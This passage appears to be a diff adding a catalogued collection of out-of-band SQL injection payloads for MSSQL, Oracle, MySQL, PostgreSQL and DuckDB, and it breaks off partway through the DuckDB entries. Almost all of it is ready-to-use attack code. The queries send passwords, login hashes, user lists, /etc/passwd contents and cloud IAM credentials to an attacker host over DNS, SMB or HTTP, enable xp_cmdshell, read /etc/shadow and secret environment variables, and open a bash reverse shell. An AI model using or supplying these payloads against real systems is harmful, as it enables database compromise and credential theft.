+# '; EXEC xp_dirtree '\\\\c23b2la0kl1krjcrd8g07h2oyyy.oast.fun\\x'--
+
+# interactsh prints callbacks in real-time:
+# [DNS] Received DNS interaction from 10.0.0.5 at 2026-03-31T14:30:00
+
+# DNS-only mode (filter HTTP noise)
+interactsh-client -dns-only -v
+
+# Self-hosted (full control -- recommended for sensitive engagements)
+interactsh-server -domain oob.yourdomain.com -ip YOUR_VPS_IP
+interactsh-client -s oob.yourdomain.com
+\`\`\`
+
+---
+
+## Payload Crafting
+
+### MSSQL OOB Payloads (25)
+
+**P-MS-01**: xp_dirtree -- basic OOB test (DNS/SMB)
+\`\`\`sql
+EXEC master..xp_dirtree '\\\\attacker.com\\test'
+\`\`\`
+DB: MSSQL | Function: xp_dirtree | Protocol: SMB/DNS | Privilege: PUBLIC | Expected: DNS query for attacker.com
+
+**P-MS-02**: xp_dirtree -- data exfiltration via subdomain
+\`\`\`sql
+DECLARE @d VARCHAR(1024);SELECT @d=(SELECT TOP 1 name FROM master..sysdatabases);
+EXEC('master..xp_dirtree "\\\\'+@d+'.attacker.com\\x"')
+\`\`\`
+DB: MSSQL | Function: xp_dirtree | Protocol: DNS | Privilege: PUBLIC | Expected: DB name as subdomain
+
+**P-MS-03**: xp_dirtree -- exfil current user
+\`\`\`sql
+DECLARE @d VARCHAR(1024);SELECT @d=SYSTEM_USER;
+EXEC('master..xp_dirtree "\\\\'+@d+'.attacker.com\\x"')
+\`\`\`
+DB: MSSQL | Function: xp_dirtree | Protocol: DNS | Privilege: PUBLIC | Expected: username.attacker.com
+
+**P-MS-04**: xp_dirtree -- stacked query injection context
+\`\`\`sql
+'; DECLARE @p VARCHAR(1024);SET @p=(SELECT password FROM users WHERE username='admin');EXEC('master..xp_dirtree "\\\\'+@p+'.attacker.com\\a"')--
+\`\`\`
+DB: MSSQL | Function: xp_dirtree | Protocol: DNS | Privilege: PUBLIC | Expected: password.attacker.com
+
+**P-MS-05**: xp_fileexist -- basic OOB test
+\`\`\`sql
+EXEC master..xp_fileexist '\\\\attacker.com\\test'
+\`\`\`
+DB: MSSQL | Function: xp_fileexist | Protocol: SMB/DNS | Privilege: PUBLIC | Expected: DNS query for attacker.com
+
+**P-MS-06**: xp_fileexist -- exfil login hash
+\`\`\`sql
+DECLARE @h VARCHAR(800);
+SELECT @h=name+'-'+master.sys.fn_varbintohexstr(password_hash) FROM sys.sql_logins;
+EXEC('xp_fileexist "\\\\'+@h+'.attacker.com\\c$\\boot.ini"')
+\`\`\`
+DB: MSSQL | Function: xp_fileexist | Protocol: DNS | Privilege: PUBLIC | Expected: loginname-hash.attacker.com
+
+**P-MS-07**: xp_subdirs -- basic OOB test
+\`\`\`sql
+EXEC master..xp_subdirs '\\\\attacker.com\\test'
+\`\`\`
+DB: MSSQL | Function: xp_subdirs | Protocol: SMB/DNS | Privilege: PUBLIC | Expected: DNS query
+
+**P-MS-08**: fn_xe_file_target_read_file -- data exfil
+\`\`\`sql
+SELECT * FROM sys.fn_xe_file_target_read_file('C:\\*.xel',
+  '\\\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\\x.xem',NULL,NULL)
+\`\`\`
+DB: MSSQL | Function: fn_xe_file_target_read_file | Protocol: SMB/DNS | Privilege: VIEW SERVER STATE | Expected: password.attacker.com
+
+**P-MS-09**: fn_get_audit_file -- server name exfil
+\`\`\`sql
+SELECT * FROM sys.fn_get_audit_file(
+  '\\\\'+@@SERVERNAME+'.attacker.com\\',default,default)
+\`\`\`
+DB: MSSQL | Function: fn_get_audit_file | Protocol: SMB/DNS | Privilege: CONTROL SERVER | Expected: servername.attacker.com
+
+**P-MS-10**: fn_trace_gettable -- database name exfil
+\`\`\`sql
+SELECT * FROM fn_trace_gettable(
+  '\\\\'+(SELECT TOP 1 name FROM master..sysdatabases WHERE database_id=1)+'.attacker.com\\x.trc',default)
+\`\`\`
+DB: MSSQL | Function: fn_trace_gettable | Protocol: SMB/DNS | Privilege: ALTER TRACE | Expected: dbname.attacker.com
+
+**P-MS-11**: xp_cmdshell -- DNS via nslookup
+\`\`\`sql
+EXEC xp_cmdshell 'nslookup exfildata.attacker.com'
+\`\`\`
+DB: MSSQL | Function: xp_cmdshell | Protocol: DNS | Privilege: sysadmin | Expected: DNS query
+
+**P-MS-12**: xp_cmdshell -- enable first, then DNS exfil
+\`\`\`sql
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+DECLARE @d VARCHAR(1024);SELECT @d=(SELECT TOP 1 password FROM users);
+EXEC xp_cmdshell 'nslookup '+@d+'.attacker.com'
+\`\`\`
+DB: MSSQL | Function: xp_cmdshell | Protocol: DNS | Privilege: sysadmin | Expected: password.attacker.com
+
+**P-MS-13**: xp_cmdshell -- HTTP via certutil
+\`\`\`sql
+EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/?d=exfildata c:\\windows\\temp\\x'
+\`\`\`
+DB: MSSQL | Function: xp_cmdshell+certutil | Protocol: HTTP | Privilege: sysadmin | Expected: HTTP GET with data
+
+**P-MS-14**: xp_cmdshell -- HTTP via PowerShell
+\`\`\`sql
+DECLARE @d VARCHAR(1024);SELECT @d=(SELECT TOP 1 password FROM users);
+EXEC xp_cmdshell 'powershell -c "IWR http://attacker.com/?d='+@d+'"'
+\`\`\`
+DB: MSSQL | Function: xp_cmdshell+PowerShell | Protocol: HTTP | Privilege: sysadmin | Expected: HTTP GET with password
+
+**P-MS-15**: OPENROWSET -- TCP connection with DNS resolution
+\`\`\`sql
+SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker.com;','SELECT 1')
+\`\`\`
+DB: MSSQL | Function: OPENROWSET | Protocol: TCP/DNS | Privilege: Ad Hoc Queries enabled | Expected: DNS+TCP connection
+
+**P-MS-16**: OLE Automation -- HTTP GET with data
+\`\`\`sql
+DECLARE @t INT;DECLARE @d NVARCHAR(4000);
+SELECT @d=(SELECT TOP 1 password FROM users);
+EXEC sp_OACreate 'MSXML2.ServerXMLHTTP',@t OUT;
+EXEC sp_OAMethod @t,'open',NULL,'GET','http://attacker.com/?d='+@d,'false';
+EXEC sp_OAMethod @t,'send';EXEC sp_OADestroy @t;
+\`\`\`
+DB: MSSQL | Function: sp_OACreate/sp_OAMethod | Protocol: HTTP | Privilege: sysadmin+OLE enabled | Expected: HTTP GET with password
+
+**P-MS-17**: OLE Automation -- HTTP POST
+\`\`\`sql
+DECLARE @t INT;DECLARE @d NVARCHAR(4000);
+SELECT @d=(SELECT TOP 1 password FROM users);
+EXEC sp_OACreate 'MSXML2.ServerXMLHTTP',@t OUT;
+EXEC sp_OAMethod @t,'open',NULL,'POST','http://attacker.com/exfil','false';
+EXEC sp_OAMethod @t,'setRequestHeader',NULL,'Content-Type','application/x-www-form-urlencoded';
+EXEC sp_OAMethod @t,'send',NULL,@d;EXEC sp_OADestroy @t;
+\`\`\`
+DB: MSSQL | Function: sp_OACreate/sp_OAMethod | Protocol: HTTP | Privilege: sysadmin+OLE enabled | Expected: HTTP POST body
+
+**P-MS-18**: OLE Automation -- WinHTTP variant
+\`\`\`sql
+DECLARE @t INT;
+EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1',@t OUT;
+EXEC sp_OAMethod @t,'open',NULL,'GET','http://attacker.com/?d=exfildata',0;
+EXEC sp_OAMethod @t,'send';EXEC sp_OADestroy @t;
+\`\`\`
+DB: MSSQL | Function: sp_OACreate+WinHTTP | Protocol: HTTP | Privilege: sysadmin+OLE enabled | Expected: HTTP GET
+
+**P-MS-19**: BULK INSERT -- UNC SMB trigger
+\`\`\`sql
+BULK INSERT tempdb..tmp FROM '\\\\attacker.com\\share\\data.csv'
+\`\`\`
+DB: MSSQL | Function: BULK INSERT | Protocol: SMB/DNS | Privilege: ADMINISTER BULK OPERATIONS | Expected: SMB+DNS
+
+**P-MS-20**: BACKUP DATABASE -- UNC SMB trigger
+\`\`\`sql
+BACKUP DATABASE [master] TO DISK='\\\\attacker.com\\share\\backup.bak'
+\`\`\`
+DB: MSSQL | Function: BACKUP | Protocol: SMB/DNS | Privilege: db_backupoperator | Expected: SMB+DNS
+
+**P-MS-21**: CREATE ASSEMBLY -- UNC DLL load trigger
+\`\`\`sql
+CREATE ASSEMBLY x FROM '\\\\attacker.com\\share\\evil.dll' WITH PERMISSION_SET=SAFE
+\`\`\`
+DB: MSSQL | Function: CREATE ASSEMBLY | Protocol: SMB/DNS | Privilege: sysadmin | Expected: SMB+DNS
+
+**P-MS-22**: WebDAV UNC -- HTTP instead of SMB (port 80)
+\`\`\`sql
+EXEC master..xp_dirtree '\\\\attacker.com@80\\webdav\\test'
+\`\`\`
+DB: MSSQL | Function: xp_dirtree+WebDAV | Protocol: HTTP (port 80) | Privilege: PUBLIC+WebDAV | Expected: HTTP via UNC
+
+**P-MS-23**: WebDAV UNC -- HTTPS variant
+\`\`\`sql
+EXEC master..xp_dirtree '\\\\attacker.com@SSL\\webdav\\test'
+\`\`\`
+DB: MSSQL | Function: xp_dirtree+WebDAV | Protocol: HTTPS | Privilege: PUBLIC+WebDAV | Expected: HTTPS via UNC
+
+**P-MS-24**: Linked Server -- DNS resolution via hostname
+\`\`\`sql
+EXEC sp_addlinkedserver @server='attacker.com'; EXEC sp_linkedservers
+\`\`\`
+DB: MSSQL | Function: sp_addlinkedserver | Protocol: TCP/DNS | Privilege: sysadmin | Expected: DNS resolution of hostname
+
+**P-MS-25**: SQL Agent Job -- OS command execution
+\`\`\`sql
+EXEC msdb..sp_add_job @job_name='exfil';
+EXEC msdb..sp_add_jobstep @job_name='exfil',@step_name='dns',
+  @subsystem='CMDEXEC',@command='nslookup data.attacker.com';
+EXEC msdb..sp_start_job @job_name='exfil';
+\`\`\`
+DB: MSSQL | Function: SQL Agent | Protocol: DNS | Privilege: SQLAgentOperator+ | Expected: DNS via scheduled job
+
+### Oracle OOB Payloads (20)
+
+**P-OR-01**: UTL_HTTP -- basic HTTP callback
+\`\`\`sql
+SELECT UTL_HTTP.REQUEST('http://attacker.com/') FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_HTTP | Protocol: HTTP | Privilege: EXECUTE+ACL | Expected: HTTP GET
+
+**P-OR-02**: UTL_HTTP -- data exfil via URL
+\`\`\`sql
+SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_HTTP | Protocol: HTTP | Privilege: EXECUTE+ACL | Expected: HTTP GET /USERNAME
+
+**P-OR-03**: UTL_HTTP -- password exfil
+\`\`\`sql
+SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM dba_users WHERE username='SYS')) FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_HTTP | Protocol: HTTP | Privilege: EXECUTE+ACL | Expected: HTTP GET /password_hash
+
+**P-OR-04**: UTL_INADDR -- DNS exfil current user
+\`\`\`sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_INADDR | Protocol: DNS | Privilege: EXECUTE+ACL | Expected: username.attacker.com
+
+**P-OR-05**: UTL_INADDR -- DNS exfil password
+\`\`\`sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS(
+  (SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_INADDR | Protocol: DNS | Privilege: EXECUTE+ACL | Expected: password.attacker.com
+
+**P-OR-06**: UTL_INADDR -- multi-field exfil
+\`\`\`sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS(
+  (SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||'.attacker.com') FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_INADDR | Protocol: DNS | Privilege: EXECUTE+ACL | Expected: dbname.user.attacker.com
+
+**P-OR-07**: DBMS_LDAP.INIT -- DNS exfil (often PUBLIC)
+\`\`\`sql
+SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',389) FROM dual
+\`\`\`
+DB: Oracle | Function: DBMS_LDAP | Protocol: LDAP/DNS | Privilege: PUBLIC (often) | Expected: DNS lookup
+
+**P-OR-08**: DBMS_LDAP.INIT -- multi-field exfil
+\`\`\`sql
+SELECT DBMS_LDAP.INIT(
+  (SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(SELECT name FROM v$database)||'.attacker.com',80) FROM dual
+\`\`\`
+DB: Oracle | Function: DBMS_LDAP | Protocol: LDAP/DNS | Privilege: PUBLIC (often) | Expected: version.user.dbname.attacker.com
+
+**P-OR-09**: HTTPURITYPE -- HTTP callback with data
+\`\`\`sql
+SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB() FROM dual
+\`\`\`
+DB: Oracle | Function: HTTPURITYPE | Protocol: HTTP | Privilege: EXECUTE+ACL | Expected: HTTP GET /username
+
+**P-OR-10**: HTTPURITYPE -- password exfil
+\`\`\`sql
+SELECT HTTPURITYPE('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)).GETCLOB() FROM dual
+\`\`\`
+DB: Oracle | Function: HTTPURITYPE | Protocol: HTTP | Privilege: EXECUTE+ACL | Expected: HTTP GET /password
+
+**P-OR-11**: XMLType XXE -- HTTP exfil (bypasses ACLs)
+\`\`\`sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.attacker.com/"> %r;]>'),'/l') FROM dual
+\`\`\`
+DB: Oracle | Function: XMLType XXE | Protocol: HTTP/DNS | Privilege: None (unpatched) | Expected: password.attacker.com
+
+**P-OR-12**: XMLType XXE -- UNION injection variant
+\`\`\`sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE username='admin')||'.attacker.com/"> %r;]>'),'/l') FROM dual--
+\`\`\`
+DB: Oracle | Function: XMLType XXE | Protocol: HTTP/DNS | Privilege: None (unpatched) | Expected: password.attacker.com
+
+**P-OR-13**: XMLType XXE -- dump all usernames (DIOS)
+\`\`\`sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://'
+  ||(SELECT SUBSTR(REPLACE(REPLACE(REPLACE(
+       LTRIM(SYS_CONNECT_BY_PATH(username,'-'),'-'),'_','-'),'$','-'),' ','-'),2,40)
+     FROM (SELECT username, ROW_NUMBER() OVER (ORDER BY username) rn,
+           COUNT(*) OVER () cnt FROM all_users WHERE ROWNUM<=40)
+     WHERE rn=cnt START WITH rn=1 CONNECT BY rn=PRIOR rn+1)
+  ||'.attacker.com/"> %r;]>'),'/l') FROM dual
+\`\`\`
+DB: Oracle | Function: XMLType XXE | Protocol: HTTP/DNS | Privilege: None (unpatched) | Expected: user1-user2-user3.attacker.com
+
+**P-OR-14**: UTL_TCP -- raw TCP connection with data
+\`\`\`sql
+DECLARE c utl_tcp.connection; retval PLS_INTEGER;
+BEGIN
+  c := utl_tcp.open_connection('attacker.com',80,tx_timeout=>2);
+  retval := utl_tcp.write_line(c,'GET /'||(SELECT user FROM dual)||' HTTP/1.0');
+  retval := utl_tcp.write_line(c,'');
+  utl_tcp.close_connection(c);
+END;
+\`\`\`
+DB: Oracle | Function: UTL_TCP | Protocol: TCP (raw) | Privilege: EXECUTE+ACL | Expected: HTTP GET /username
+
+**P-OR-15**: UTL_SMTP -- SMTP connection trigger
+\`\`\`sql
+DECLARE c utl_smtp.connection;
+BEGIN
+  c := UTL_SMTP.OPEN_CONNECTION((SELECT user FROM dual)||'.attacker.com',25,2);
+END;
+\`\`\`
+DB: Oracle | Function: UTL_SMTP | Protocol: SMTP/DNS | Privilege: EXECUTE+ACL | Expected: DNS lookup username.attacker.com
+
+**P-OR-16**: DBMS_XMLGEN -- XXE variant
+\`\`\`sql
+SELECT DBMS_XMLGEN.GETXML('SELECT EXTRACTVALUE(xmltype(''<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY % x SYSTEM "http://''||user||''.attacker.com/"> %x;]>''),''/l'') FROM dual') FROM dual
+\`\`\`
+DB: Oracle | Function: DBMS_XMLGEN | Protocol: HTTP/DNS | Privilege: EXECUTE | Expected: user.attacker.com
+
+**P-OR-17**: SYS.DBMS_LDAP.INIT -- SYS schema variant
+\`\`\`sql
+SELECT SYS.DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',80) FROM dual
+\`\`\`
+DB: Oracle | Function: SYS.DBMS_LDAP | Protocol: LDAP/DNS | Privilege: PUBLIC (often) | Expected: DNS lookup
+
+**P-OR-18**: DBMS_CLOUD.SEND_REQUEST -- modern HTTP (19c+)
+\`\`\`sql
+BEGIN
+  DBMS_CLOUD.create_credential(credential_name=>'NOAUTH',username=>'x',password=>'x');
+END;
+/
+DECLARE resp DBMS_CLOUD_TYPES.resp;
+BEGIN
+  resp := DBMS_CLOUD.send_request(credential_name=>'NOAUTH',
+    uri=>'http://attacker.com/?d='||(SELECT user FROM dual),method=>'GET',timeout=>3);
+END;
+\`\`\`
+DB: Oracle | Function: DBMS_CLOUD | Protocol: HTTP/HTTPS | Privilege: CREATE CREDENTIAL+ACL | Expected: HTTP GET with data
+
+**P-OR-19**: Base64 encoding for DNS-safe exfil
+\`\`\`sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY % x SYSTEM "http://'
+  ||REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(
+      UTL_RAW.CAST_TO_RAW((SELECT password FROM users WHERE ROWNUM=1)))),'=','-')
+  ||'.attacker.com/"> %x;]>'),'/l') FROM dual
+\`\`\`
+DB: Oracle | Function: XMLType+BASE64 | Protocol: HTTP/DNS | Privilege: None (unpatched) | Expected: base64_password.attacker.com
+
+**P-OR-20**: UTL_HTTP SSRF -- cloud metadata
+\`\`\`sql
+SELECT UTL_HTTP.REQUEST('http://169.254.169.254/latest/meta-data/iam/security-credentials/') FROM dual
+\`\`\`
+DB: Oracle | Function: UTL_HTTP | Protocol: HTTP | Privilege: EXECUTE+ACL | Expected: IAM credentials in response
+
+### MySQL OOB Payloads (10)
+
+**P-MY-01**: LOAD_FILE -- basic OOB test (Windows only)
+\`\`\`sql
+SELECT LOAD_FILE('\\\\\\\\attacker.com\\\\share')
+\`\`\`
+DB: MySQL | Function: LOAD_FILE | Protocol: SMB/DNS | Privilege: FILE | Expected: DNS query (Windows only)
+
+**P-MY-02**: LOAD_FILE -- data exfil via subdomain
+\`\`\`sql
+SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\\\a'))
+\`\`\`
+DB: MySQL | Function: LOAD_FILE | Protocol: SMB/DNS | Privilege: FILE | Expected: password.attacker.com
+
+**P-MY-03**: LOAD_FILE -- version exfil
+\`\`\`sql
+SELECT LOAD_FILE(CONCAT('\\\\\\\\', VERSION(), '.attacker.com\\\\a'))
+\`\`\`
+DB: MySQL | Function: LOAD_FILE | Protocol: SMB/DNS | Privilege: FILE | Expected: version.attacker.com
+
+**P-MY-04**: LOAD_FILE -- current user exfil
+\`\`\`sql
+SELECT LOAD_FILE(CONCAT('\\\\\\\\', CURRENT_USER(), '.attacker.com\\\\a'))
+\`\`\`
+DB: MySQL | Function: LOAD_FILE | Protocol: SMB/DNS | Privilege: FILE | Expected: user.attacker.com
+
+**P-MY-05**: LOAD_FILE -- hex encoded (special chars safe)
+\`\`\`sql
+SELECT LOAD_FILE(CONCAT('\\\\\\\\', HEX((SELECT password FROM users LIMIT 1)), '.attacker.com\\\\a'))
+\`\`\`
+DB: MySQL | Function: LOAD_FILE+HEX | Protocol: SMB/DNS | Privilege: FILE | Expected: hex_password.attacker.com
+
+**P-MY-06**: INTO OUTFILE -- UNC write trigger
+\`\`\`sql
+SELECT 'data' INTO OUTFILE '\\\\\\\\attacker.com\\\\share\\\\output.txt'
+\`\`\`
+DB: MySQL | Function: INTO OUTFILE | Protocol: SMB/DNS | Privilege: FILE | Expected: SMB connection
+
+**P-MY-07**: INTO OUTFILE -- exfil query result
+\`\`\`sql
+SELECT password FROM users INTO OUTFILE '\\\\\\\\attacker.com\\\\share\\\\dump.txt'
+\`\`\`
+DB: MySQL | Function: INTO OUTFILE | Protocol: SMB/DNS | Privilege: FILE | Expected: SMB write with data
+
+**P-MY-08**: LOAD DATA INFILE -- UNC read trigger
+\`\`\`sql
+LOAD DATA INFILE '\\\\\\\\attacker.com\\\\share\\\\data.txt' INTO TABLE test
+\`\`\`
+DB: MySQL | Function: LOAD DATA INFILE | Protocol: SMB/DNS | Privilege: FILE | Expected: SMB read
+
+**P-MY-09**: UDF sys_exec -- arbitrary DNS
+\`\`\`sql
+SELECT sys_exec(CONCAT('nslookup ', (SELECT password FROM users LIMIT 1), '.attacker.com'))
+\`\`\`
+DB: MySQL | Function: UDF (lib_mysqludf_sys) | Protocol: DNS | Privilege: Plugin dir write | Expected: DNS query
+
+**P-MY-10**: UDF sys_eval -- arbitrary HTTP
+\`\`\`sql
+SELECT sys_eval(CONCAT('curl http://attacker.com/?d=', (SELECT password FROM users LIMIT 1)))
+\`\`\`
+DB: MySQL | Function: UDF (lib_mysqludf_sys) | Protocol: HTTP | Privilege: Plugin dir write | Expected: HTTP GET
+
+### PostgreSQL OOB Payloads (10)
+
+**P-PG-01**: COPY TO PROGRAM -- DNS via nslookup
+\`\`\`sql
+COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker.com'
+\`\`\`
+DB: PostgreSQL | Function: COPY TO PROGRAM | Protocol: DNS | Privilege: Superuser | Expected: DNS query
+
+**P-PG-02**: COPY TO PROGRAM -- HTTP via curl
+\`\`\`sql
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?d='||(SELECT current_user)
+\`\`\`
+DB: PostgreSQL | Function: COPY TO PROGRAM | Protocol: HTTP | Privilege: Superuser | Expected: HTTP GET
+
+**P-PG-03**: COPY TO PROGRAM -- HTTP POST with user list
+\`\`\`sql
+COPY (SELECT '') TO PROGRAM 'curl -X POST -d "data='||(SELECT string_agg(usename,',') FROM pg_user)||'" http://attacker.com/exfil'
+\`\`\`
+DB: PostgreSQL | Function: COPY TO PROGRAM | Protocol: HTTP | Privilege: Superuser | Expected: HTTP POST body
+
+**P-PG-04**: COPY TO PROGRAM -- password hash exfil
+\`\`\`sql
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?d='||(SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow)
+\`\`\`
+DB: PostgreSQL | Function: COPY TO PROGRAM | Protocol: HTTP | Privilege: Superuser | Expected: HTTP GET with hashes
+
+**P-PG-05**: PL/pgSQL reusable DNS exfil function
+\`\`\`sql
+CREATE OR REPLACE FUNCTION exfil(q TEXT) RETURNS VOID AS $$
+DECLARE r TEXT; cmd TEXT;
+BEGIN
+  EXECUTE q INTO r;
+  cmd := E'COPY (SELECT \\'\\') TO PROGRAM \\'nslookup '||r||E'.attacker.com\\'';
+  EXECUTE cmd;
+END;
+$$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT exfil('SELECT current_user');
+\`\`\`
+DB: PostgreSQL | Function: PL/pgSQL+COPY | Protocol: DNS | Privilege: Superuser | Expected: DNS query
+
+**P-PG-06**: dblink_connect -- DNS via connection attempt
+\`\`\`sql
+CREATE EXTENSION IF NOT EXISTS dblink;
+SELECT dblink_connect('host='||(SELECT current_user)||'.attacker.com dbname=x');
+\`\`\`
+DB: PostgreSQL | Function: dblink | Protocol: TCP/DNS | Privilege: dblink ext+DBA | Expected: DNS query
+
+**P-PG-07**: dblink_connect_u -- password hash exfil
+\`\`\`sql
+SELECT dblink_connect_u('host='||(SELECT passwd FROM pg_shadow LIMIT 1)||'.attacker.com port=5432 sslmode=disable dbname=x');
+\`\`\`
+DB: PostgreSQL | Function: dblink | Protocol: TCP/DNS | Privilege: dblink ext+Superuser | Expected: hash.attacker.com
+
+**P-PG-08**: lo_export -- UNC path write (Windows)
+\`\`\`sql
+SELECT lo_export(0, '\\\\attacker.com\\share\\output')
+\`\`\`
+DB: PostgreSQL | Function: lo_export | Protocol: SMB/DNS | Privilege: Superuser | Expected: SMB connection (Windows)
+
+**P-PG-09**: pg_read_file + COPY -- file content exfil
+\`\`\`sql
+COPY (SELECT pg_read_file('/etc/hostname')) TO PROGRAM 'curl -d @- http://attacker.com/exfil'
+\`\`\`
+DB: PostgreSQL | Function: pg_read_file+COPY | Protocol: HTTP | Privilege: Superuser | Expected: HTTP POST file content
+
+**P-PG-10**: system() C function -- full OS command
+\`\`\`sql
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C' STRICT;
+SELECT system('nslookup '||(SELECT current_user)||'.attacker.com');
+\`\`\`
+DB: PostgreSQL | Function: system() UDF | Protocol: DNS | Privilege: Superuser+CREATE | Expected: DNS query
+
+### DuckDB OOB Payloads (15)
+
+**P-DK-01**: read_csv_auto -- HTTP fetch as data source
+\`\`\`sql
+SELECT * FROM read_csv_auto('http://attacker.com/exfil?data='||current_database())
+\`\`\`
+DB: DuckDB | Function: read_csv_auto | Protocol: HTTP | Privilege: Query execution | Expected: HTTP GET with DB name
+
+**P-DK-02**: httpfs extension -- explicit HTTP access
+\`\`\`sql
+INSTALL httpfs; LOAD httpfs;
+SELECT * FROM read_csv_auto('http://attacker.com/?d='||(SELECT group_concat(table_name) FROM information_schema.tables))
+\`\`\`
+DB: DuckDB | Function: httpfs | Protocol: HTTP | Privilege: Query execution | Expected: HTTP GET with table list
+
+**P-DK-03**: COPY TO S3 -- bulk exfiltration via cloud storage
+\`\`\`sql
+COPY (SELECT * FROM read_csv_auto('/etc/passwd')) TO 's3://attacker-bucket/dump.parquet' (FORMAT PARQUET)
+\`\`\`
+DB: DuckDB | Function: COPY TO+S3 | Protocol: HTTPS (S3 API) | Privilege: Query execution+S3 creds | Expected: Full file written to attacker's S3 bucket
+
+**P-DK-04**: read_parquet S3 -- credential-bearing request
+\`\`\`sql
+SELECT * FROM read_parquet('s3://bucket-name/sensitive-data.parquet')
+\`\`\`
+DB: DuckDB | Function: read_parquet+S3 | Protocol: HTTPS (S3 API) | Privilege: Query execution+S3 creds | Expected: S3 request with credentials
+
+**P-DK-05**: read_csv_auto -- SSRF to cloud metadata
+\`\`\`sql
+SELECT * FROM read_csv_auto('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+\`\`\`
+DB: DuckDB | Function: read_csv_auto | Protocol: HTTP | Privilege: Query execution | Expected: Cloud IAM credentials
+
+**P-DK-06**: read_blob -- arbitrary binary file read
+\`\`\`sql
+SELECT content FROM read_blob('/etc/shadow')
+\`\`\`
+DB: DuckDB | Function: read_blob | Protocol: Filesystem | Privilege: Query execution | Expected: Shadow file contents as BLOB
+
+**P-DK-07**: read_text -- arbitrary text file read with metadata
+\`\`\`sql
+SELECT filename, size, last_modified, content FROM read_text('/etc/passwd')
+\`\`\`
+DB: DuckDB | Function: read_text | Protocol: Filesystem | Privilege: Query execution | Expected: File content + metadata
+
+**P-DK-08**: getenv -- environment variable extraction (CLI only)
+\`\`\`sql
+SELECT getenv('AWS_SECRET_ACCESS_KEY') AS aws_key,
+       getenv('DATABASE_URL') AS db_url,
+       getenv('GF_SECURITY_ADMIN_PASSWORD') AS grafana_pw
+\`\`\`
+DB: DuckDB CLI | Function: getenv | Protocol: N/A | Privilege: CLI execution | Expected: Environment variable values
+
+**P-DK-09**: http_request extension -- direct OOB POST exfiltration
+\`\`\`sql
+INSTALL http_request FROM community; LOAD http_request;
+SELECT * FROM http_post(
+  'http://attacker.com/exfil',
+  (SELECT string_agg(content, E'\\n') FROM read_text('/etc/passwd')),
+  'text/plain'
+)
+\`\`\`
+DB: DuckDB | Function: http_post | Protocol: HTTP POST | Privilege: Query+community ext | Expected: HTTP POST with file contents in body
+
+**P-DK-10**: http_request extension -- GET with custom headers
+\`\`\`sql
+INSTALL http_request FROM community; LOAD http_request;
+SELECT * FROM http_get(
+  'http://attacker.com/exfil',
+  headers := MAP {'X-Data': (SELECT current_database()), 'X-User': current_user}
+)
+\`\`\`
+DB: DuckDB | Function: http_get | Protocol: HTTP GET | Privilege: Query+community ext | Expected: HTTP GET with data in custom headers
+
+**P-DK-11**: shellfs extension -- OS command execution (RCE)
+\`\`\`sql
+INSTALL shellfs FROM community; LOAD shellfs;
+SELECT * FROM read_csv('id |')
+\`\`\`
+DB: DuckDB | Function: shellfs pipe | Protocol: OS exec | Privilege: Query+community ext | Expected: Output of \`id\` command
+
+**P-DK-12**: shellfs -- reverse shell
+\`\`\`sql
+INSTALL shellfs FROM community; LOAD shellfs;
+SELECT * FROM read_csv('bash -c "sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" |')
+\`\`\`
+DB: DuckDB | Function: shellfs pipe | Protocol: TCP (reverse shell) | Privilege: Query+community ext | Expected: Reverse shell connection
+
+**P-DK-13**: read_json_auto -- JSON over HTTP exfiltration
+\`\`\`sql
+SELECT * FROM read_json_auto(
+  'http://attacker.com/exfil.json?tables='||(
+    SELECT string_agg(table_name, ',') FROM information_schema.tables
+  )
+)
+\`\`\`
+DB: DuckDB | Function: read_json_auto | Protocol: HTTP | Privilege: Query execution | Expected: HTTP GET with table list in URL
+
+**P-DK-14**: ATTACH remote DuckDB -- read-only remote database access
+\`\`\`sql
